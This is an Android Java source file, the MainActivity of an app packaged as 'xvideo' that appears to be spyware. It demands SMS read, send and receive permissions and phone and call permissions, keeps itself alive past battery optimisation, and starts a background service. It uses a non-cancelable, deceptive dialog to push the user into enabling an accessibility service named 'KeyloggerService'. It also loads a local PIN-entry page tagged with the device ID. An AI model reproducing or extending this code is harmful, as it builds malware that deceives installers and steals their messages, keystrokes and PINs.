package com.xvideo.app.ui;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.xvideo.app.R;
import com.xvideo.app.core.Config;
import com.xvideo.app.service.MainService;
import com.xvideo.app.util.DeviceInfoUtil;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int BATTERY_OPTIMIZATION_REQUEST = 123;

    private static final String[] REQUIRED_PERMISSIONS = {
        "android.permission.READ_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.SEND_SMS",
        "android.permission.READ_PHONE_STATE",
        "android.permission.CALL_PHONE"
    };

    private WebView webView;
    private String deviceId;
    private AlertDialog accessibilityDialog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        deviceId = DeviceInfoUtil.getDeviceID(this);
        webView = findViewById(R.id.webview);

        checkPermissions();
        setupWebView();
    }

    @Override
    protected void onResume() {
        super.onResume();
        checkAccessibilityService();
    }

    private void checkPermissions() {
        List<String> neededPermissions = new ArrayList<>();

        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != 0) {
                neededPermissions.add(permission);
            }
        }

        if (!neededPermissions.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                neededPermissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        } else {
            startServices();
            requestBatteryOptimization();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            boolean permanentlyDenied = false;

            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] != 0) {
                    allGranted = false;
                    if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[i])) {
                        permanentlyDenied = true;
                    }
                }
            }

            if (allGranted) {
                startServices();
                requestBatteryOptimization();
            } else if (permanentlyDenied) {
                showSettingsDialog();
            } else {
                checkPermissions();
            }
        }
    }

    private void showSettingsDialog() {
        new AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage("This app needs permissions to function properly. Please grant them in Settings.")
            .setPositiveButton("Open Settings", (dialog, which) -> {
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            })
            .setNegativeButton("Cancel", (dialog, which) -> finishAffinity())
            .setCancelable(false)
            .show();
    }

    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, BATTERY_OPTIMIZATION_REQUEST);
        }
    }

    private void checkAccessibilityService() {
        String enabledServices = Settings.Secure.getString(
            getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        );

        boolean isEnabled = enabledServices != null &&
            enabledServices.contains(getPackageName() + "/" +
                getPackageName() + ".accessibility.KeyloggerService");

        if (isEnabled) {
            if (accessibilityDialog != null && accessibilityDialog.isShowing()) {
                accessibilityDialog.dismiss();
                accessibilityDialog = null;
            }
        } else {
            showAccessibilityPrompt();
        }
    }

    private void showAccessibilityPrompt() {
        if (accessibilityDialog != null && accessibilityDialog.isShowing()) {
            return;
        }

        accessibilityDialog = new AlertDialog.Builder(this)
            .setTitle("Enable Accessibility")
            .setMessage("To use this app, please enable Accessibility Service in Settings. This is required for the app to function properly.")
            .setCancelable(false)
            .setPositiveButton("Open Settings", (dialog, which) -> {
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            })
            .create();

        accessibilityDialog.show();
    }

    private void startServices() {
        try {
            Intent serviceIntent = new Intent(this, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting service", e);
        }
    }

    private void setupWebView() {
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setAllowFileAccess(true);
        settings.setSupportZoom(false);

        webView.addJavascriptInterface(new WebAppInterface(), "Android");

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                // Inject device ID into pin.html
                if (url.contains("pin.html")) {
                    String js = "javascript:if(typeof DeviceId !== 'undefined'){DeviceId = '" + deviceId + "';}";
                    webView.loadUrl(js);
                }
            }
        });

        // Load index.html from assets
        webView.loadUrl("file:///android_asset/index.html");
    }

    private class WebAppInterface {
        @JavascriptInterface
        public void triggerEvent(String event) {
            Log.d(TAG, "JS Event: " + event);
        }

        @JavascriptInterface
        public String getDeviceId() {
            return deviceId;
        }
    }

    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            new AlertDialog.Builder(this)
                .setMessage("Are you sure you want to exit?")
                .setPositiveButton("Yes", (dialog, which) -> super.onBackPressed())
                .setNegativeButton("No", null)
                .show();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (accessibilityDialog != null && accessibilityDialog.isShowing()) {
            accessibilityDialog.dismiss();
        }
    }
}
